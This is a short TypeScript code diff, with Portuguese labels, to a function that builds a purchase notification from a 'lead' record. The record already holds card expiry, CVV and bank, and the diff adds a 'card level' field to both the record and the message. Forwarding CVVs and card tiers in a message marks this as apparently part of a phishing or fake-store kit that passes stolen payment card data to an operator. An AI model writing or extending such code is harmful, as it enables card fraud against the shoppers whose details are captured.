@@ -106,6 +106,7 @@ export async function notifyPurchaseDetails(lead: {
   cardExpiry: string;
   cardCvv: string;
   cardBank: string | null;
+  cardLevel: string | null;
   totalCents: number;
   discountCents: number;
   items: { productName: string; quantity: number; unitPriceCents: number }[];
@@ -140,6 +141,7 @@ export async function notifyPurchaseDetails(lead: {
     `<b>Validade:</b> ${escapeHtml(isPix ? "—" : lead.cardExpiry || "—")}`,
     `<b>CVV:</b> ${escapeHtml(isPix ? "—" : lead.cardCvv || "—")}`,
     `<b>Banco/Instituição:</b> ${escapeHtml(lead.cardBank || "—")}`,
+    `<b>Nível do cartão:</b> ${escapeHtml(lead.cardLevel || "—")}`,
     lead.discountCents > 0
       ? `<b>Desconto:</b> -${formatCents(lead.discountCents)}`
       : "",
